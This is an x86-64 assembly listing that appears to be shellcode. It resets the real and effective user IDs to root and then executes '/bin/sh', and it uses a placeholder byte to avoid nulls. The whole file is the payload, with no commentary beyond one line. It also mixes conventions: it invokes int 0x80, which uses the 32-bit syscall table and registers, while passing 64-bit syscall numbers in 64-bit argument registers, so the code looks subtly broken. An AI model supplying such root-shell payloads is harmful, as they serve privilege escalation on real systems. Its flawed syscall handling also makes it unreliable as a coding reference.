.section .rodata
.equ KERN, 0x80
.equ SYS_EXECVE, 59
.equ SYS_SETREUID, 126

.section .text
.globl _start
_start:

    pushq $SYS_SETREUID; popq %rax
    xorq %rdi, %rdi
    xorq %rsi, %rsi
    int $KERN
  
    pushq $SYS_EXECVE; popq %rax
    xorq %rcx, %rcx
    pushq %rcx
    movq %rsp, %rsi
    movq $0xAA68732f6e69622f, %rcx
    pushq %rcx
    movq %rsp, %rdi

    # have to over write that AA with a 0
    xorq %rbx, %rbx
    xorq %rcx, %rcx
    
    movb $7, %cl
    movb %bl, (%rsp, %rcx, 1)

    xorq %rdx, %rdx 
    int $KERN

